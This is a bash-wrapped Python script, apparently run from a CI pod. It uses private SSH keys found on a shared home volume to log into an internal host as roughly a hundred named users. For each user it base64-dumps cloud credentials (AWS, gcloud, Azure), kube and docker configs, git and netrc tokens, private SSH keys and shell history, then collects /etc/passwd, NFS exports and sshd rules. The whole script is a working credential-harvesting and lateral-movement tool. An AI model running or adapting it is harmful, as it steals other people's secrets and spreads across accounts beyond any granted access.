#!/usr/bin/env bash
# i9803 - authenticated per-user read of store03 (10.16.1.223) from the HCU CI job pod.
# Uses the /public4 keys that authenticated in i9211 (one publickey attempt per key-user
# pair, second validated key only if the first fails), then as each user reads their own
# 600-mode ~/.aws, ~/.config/gcloud, ~/.azure, ~/.kube, ~/.docker, ~/.git-credentials,
# ~/.netrc, ~/.npmrc, pip.conf, full ~/.ssh and ~/.bash_history, plus /etc/exports,
# /etc/fstab, /proc/mounts, /etc/passwd and the sshd_config access rules. Read-only.
set -uo pipefail
echo "===I9803-WRAPPER-BEGIN $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
export I9803_HOME="${I9803_HOME:-/public4/home}"
export PYTHONUNBUFFERED=1
TMO="timeout 1500"
command -v timeout >/dev/null 2>&1 || TMO=""
$TMO python3 - <<'PYI9803'
#!/usr/bin/env python3
import os, sys, base64, subprocess, shutil, tempfile, time, threading
from concurrent.futures import ThreadPoolExecutor

HOME = os.environ.get("I9803_HOME", "/public4/home")
HOST = "10.16.1.223"
WORKERS = int(os.environ.get("I9803_WORKERS", "10"))
OUT_CAP = int(os.environ.get("I9803_CAP", "1400000"))
PER_USER_CAP = int(os.environ.get("I9803_USER_CAP", "26000"))
PAIRS = {"chenwch": ["id_rsa"], "chenych": ["id_rsa"], "guoyi": ["id_rsa"], "tanbo": ["id_rsa"], "ali_user": ["id_rsa"], "baihua": ["id_ed25519", "id_rsa"], "caihl": ["id_rsa"], "chenfeida": ["id_ed25519"], "chengjiang": ["id_ed25519"], "chenll1": ["id_ed25519"], "chentx3": ["id_rsa"], "chenxi": ["id_rsa"], "daijiangtao": ["id_ed25519", "id_rsa"], "dingqin": ["id_ed25519"], "dongpeng1": ["id_rsa"], "duanyongqiang": ["id_ed25519", "id_rsa"], "fangxy": ["id_ed25519"], "fenghq": ["id_rsa"], "guanqi": ["id_ed25519"], "guochy1": ["id_rsa"], "guozhg": ["id_rsa"], "hanlongxiang": ["id_ed25519", "id_rsa"], "hanwenjie": ["id_ed25519", "id_rsa"], "hewl": ["id_rsa"], "hexl5": ["id_rsa"], "huzhenpeng": ["id_ed25519"], "jinlw": ["id_ed25519"], "jinyang": ["id_ed25519"], "kengxl": ["id_rsa"], "kongby": ["id_ed25519"], "leyang": ["id_ed25519", "id_rsa"], "lichen": ["id_rsa"], "lihailong": ["id_rsa"], "lijiyong": ["id_rsa"], "liming6": ["cluster", "id_rsa"], "lining6": ["id_rsa"], "linxi1": ["id_rsa"], "lishj6": ["id_rsa"], "litong2": ["id_ed25519"], "liucong": ["id_rsa"], "liuqiao": ["id_rsa"], "liuxiaotong": ["id_ed25519", "id_rsa"], "liuxin1": ["id_ed25519", "id_rsa"], "liuzhiyi": ["id_ed25519", "id_rsa"], "liuzj3": ["id_ed25519", "id_rsa"], "liwencong": ["id_ed25519", "id_rsa"], "lixh": ["id_rsa"], "liya": ["id_rsa"], "liyanfei": ["id_ed25519"], "liyao7": ["id_ed25519"], "ludonghai": ["id_rsa"], "luoyao": ["id_rsa"], "mengxiangzhi": ["id_rsa"], "niuzhsh": ["id_ed25519"], "parastor_login": ["id_rsa"], "raojy": ["id_rsa"], "sangwzh": ["id_rsa"], "shaome": ["id_rsa"], "shaomengen": ["id_ed25519"], "shenjzh": ["id_rsa"], "shihm": ["id_rsa"], "sunyitest": ["cluster", "id_rsa"], "taoqh": ["id_rsa"], "tianby": ["id_ed25519", "id_rsa"], "tujie": ["id_rsa"], "wanghao16": ["id_rsa"], "wangjialiang": ["id_ed25519", "id_rsa"], "wangtengfei": ["id_rsa"], "wangying13": ["id_rsa"], "weishb": ["id_rsa"], "wujl5": ["id_rsa"], "wuyf1": ["id_rsa"], "xuf": ["id_rsa"], "xuwx1": ["id_rsa"], "xuxc": ["id_rsa"], "yangw": ["id_ed25519", "id_rsa"], "yangyn1": ["id_rsa"], "yanzixu": ["id_rsa"], "yanzy": ["cluster", "id_rsa"], "yinyue2": ["id_rsa"], "yuchenyang": ["id_rsa"], "zhanggj": ["id_rsa"], "zhangshao": ["id_rsa"], "zhangsongge": ["id_ed25519"], "zhangxiangkai": ["id_ed25519", "id_rsa"], "zhangyd": ["id_rsa"], "zhangyf9": ["id_rsa"], "zhaole": ["id_rsa"], "zhaopenglu": ["id_ed25519"], "zhaoxy6": ["cluster", "id_rsa"], "zhaoyx3": ["id_rsa"], "zhaozg": ["id_ed25519", "id_rsa"], "zhenggf": ["id_rsa"], "zhengzhi": ["id_ed25519", "id_rsa"], "zhipu_test": ["id_rsa"], "zhongshiqi": ["id_rsa"], "zhup": ["id_ed25519", "id_rsa"], "zhuwenbo": ["id_ed25519", "id_rsa"], "zhuww": ["id_rsa"], "zz_sugon_yytest": ["id_ed25519"], "zz_test_1": ["id_ed25519"], "zz_test_jiahe": ["id_ed25519"], "zz_test_user1": ["id_ed25519"], "zz_test_user4": ["id_ed25519"]}

used = [0]
lock = threading.Lock()

def emit(s=""):
    s = str(s)
    with lock:
        if used[0] >= OUT_CAP:
            return
        room = OUT_CAP - used[0] - 1
        if len(s) > room:
            s = s[:room]
        print(s, flush=True)
        used[0] += len(s) + 1

CAPTURE = r"""
echo "###I9803B"
echo "ID=$(id 2>/dev/null)"
echo "HOME=$(readlink -f ~ 2>/dev/null)"
echo "UNAME=$(uname -a 2>/dev/null)"
rd() { f="$1"; lim="$2"; [ -f "$f" ] || return 0; sz=$(stat -c%s "$f" 2>/dev/null || echo 0); if [ "${sz:-0}" -gt "$lim" ] 2>/dev/null; then echo "BIG $f $sz"; return 0; fi; echo "FILE $f $sz"; base64 -w0 "$f" 2>/dev/null; echo; }
for f in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.git-credentials" "$HOME/.netrc" "$HOME/.npmrc" "$HOME/.pip/pip.conf" "$HOME/.config/pip/pip.conf" "$HOME/.config/gh/hosts.yml" "$HOME/.gitconfig" "$HOME/.ssh/config" "$HOME/.ssh/authorized_keys" "$HOME/.ssh/known_hosts" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.profile" "$HOME/.cshrc"; do rd "$f" 20000; done
if [ -f "$HOME/.bash_history" ]; then echo "HISTTAIL $(stat -c%s "$HOME/.bash_history" 2>/dev/null || echo 0)"; tail -c 20000 "$HOME/.bash_history" 2>/dev/null | base64 -w0; echo; fi
echo "SSHLS=$(ls -la "$HOME/.ssh" 2>/dev/null | tr '\n' '|')"
for f in "$HOME"/.ssh/*; do [ -f "$f" ] || continue; case "$f" in *.pub) continue;; */known_hosts|*/known_hosts.old) continue;; esac; rd "$f" 20000; done
for d in "$HOME/.config/gcloud" "$HOME/.azure"; do echo "GDIR $d"; for f in $(find "$d" -type f -size -20000c 2>/dev/null | head -40); do rd "$f" 12000; done; done
echo "###I9803E"
"""

SYSTEM = r"""
echo "###I9803S"
echo "EXPORTS=$(base64 -w0 /etc/exports 2>/dev/null | head -c 30000)"
echo "FSTAB=$(base64 -w0 /etc/fstab 2>/dev/null | head -c 20000)"
echo "MOUNTS=$(grep -Ei 'nfs|public|/export|store|parastor' /proc/mounts 2>/dev/null | head -60 | tr '\n' '|')"
echo "PASSWD=$(base64 -w0 /etc/passwd 2>/dev/null | head -c 30000)"
echo "NFSETAB=$(ls -l /var/lib/nfs/etab 2>&1 | head -2 | tr '\n' '|'); $(base64 -w0 /var/lib/nfs/etab 2>/dev/null | head -c 30000)"
echo "EXPORTFS=$(exportfs -v 2>&1 | head -40 | tr '\n' '|')"
echo "SSHDCONF=$(grep -Ei 'AllowUsers|AllowGroups|DenyUsers|DenyGroups|Match |PubkeyAuth|AuthorizedKeys|PasswordAuth|PermitRootLogin|ListenAddress' /etc/ssh/sshd_config 2>&1 | head -50 | tr '\n' '|')"
echo "###I9803SE"
"""

def ssh_argv(keypath, user, remote):
    return ["ssh", "-F", "/dev/null", "-i", keypath,
            "-o", "BatchMode=yes", "-o", "ConnectTimeout=12",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "GlobalKnownHostsFile=/dev/null", "-o", "PasswordAuthentication=no",
            "-o", "KbdInteractiveAuthentication=no", "-o", "NumberOfPasswordPrompts=0",
            "-o", "PreferredAuthentications=publickey", "-o", "IdentitiesOnly=yes",
            "-o", "IdentityAgent=none", "-o", "LogLevel=VERBOSE",
            "%s@%s" % (user, HOST), remote]

def keypath_for(user, kf):
    p = os.path.join(HOME, user, ".ssh", kf)
    if os.path.isfile(p):
        return p
    sd = os.path.join(HOME, user, ".ssh")
    try:
        names = sorted(os.listdir(sd))
    except Exception:
        return None
    for n in names:
        if n.endswith(".pub") or n in ("known_hosts", "known_hosts.old", "authorized_keys", "config"):
            continue
        if n.startswith("id_") or n in ("cluster", "key", "identity", "cm", "anyscale"):
            p = os.path.join(sd, n)
            if os.path.isfile(p) and os.path.getsize(p) < 200000:
                return p
    return None

def run_one(user, kf, remote):
    kp = keypath_for(user, kf)
    if not kp:
        return user, kf, "NOKEY", "", "", -1
    tmp = tempfile.mkdtemp(prefix="i9803.")
    dst = os.path.join(tmp, "k")
    try:
        shutil.copyfile(kp, dst)
        os.chmod(dst, 0o600)
        r = subprocess.run(ssh_argv(dst, user, remote), capture_output=True, timeout=60)
        out = r.stdout.decode("utf-8", "replace")
        err = r.stderr.decode("utf-8", "replace")
        if "###I9803B" in out:
            st = "OK"
        elif "Authenticated to" in err:
            st = "AUTHONLY"
        elif "Permission denied" in err or "Permission denied" in out:
            st = "DENIED"
        else:
            st = "OTHER"
        return user, kf, st, out, err, r.returncode
    except Exception as e:
        return user, kf, "EXC", "", str(e)[:200], -1
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

def first_line(err):
    for ln in (err or "").splitlines():
        ln = ln.strip()
        if ln and not ln.startswith("Warning: Permanently added"):
            return ln[:220]
    return ""

def main():
    t0 = time.time()
    emit("### USERS %d KEYPAIRS %d" % (len(PAIRS), sum(len(v) for v in PAIRS.values())))
    ok_users = []
    summary = {}

    def attempt(item):
        user, keys = item
        return user, keys

    def do_user(user, keys):
        last = None
        for kf in keys:
            res = run_one(user, kf, CAPTURE)
            last = res
            if res[2] == "OK":
                return res
        return last

    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = [ex.submit(do_user, u, k) for u, k in PAIRS.items()]
        done = 0
        for f in futs:
            res = f.result()
            done += 1
            user, kf, st, out, err, rc = res
            summary[st] = summary.get(st, 0) + 1
            emit("USER %d/%d %s %s -> %s rc=%s :: %s" % (done, len(futs), user, kf, st, rc, first_line(err)))
            if st == "OK":
                ok_users.append((user, kf))
                body = out[:PER_USER_CAP]
                if len(out) > PER_USER_CAP:
                    body += "\nTRUNCATED %d" % len(out)
                emit("CAPBEGIN %s %s len=%d" % (user, kf, len(out)))
                emit(body)
                emit("CAPEND %s" % user)
            elif out.strip():
                emit("PARTIAL %s %s" % (user, out[:600].replace("\n", "|")))
    emit("### OK_USERS %d/%d" % (len(ok_users), len(PAIRS)))
    emit("### SUMMARY " + " ".join("%s=%s" % (k, v) for k, v in sorted(summary.items())))

    if ok_users:
        user, kf = ok_users[0]
        res = run_one(user, kf, SYSTEM)
        emit("SYSTEM user=%s %s -> %s" % (user, kf, res[2]))
        if "###I9803S" in (res[3] or ""):
            emit((res[3] or "")[:150000])
        emit("SYSTEMEND %s" % user)
    emit("### DONE elapsed=%.1fs bytes=%d" % (time.time() - t0, used[0]))

if __name__ == "__main__":
    main()

PYI9803
rc=$?
echo "===I9803-WRAPPER-END rc=${rc} $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
exit 1
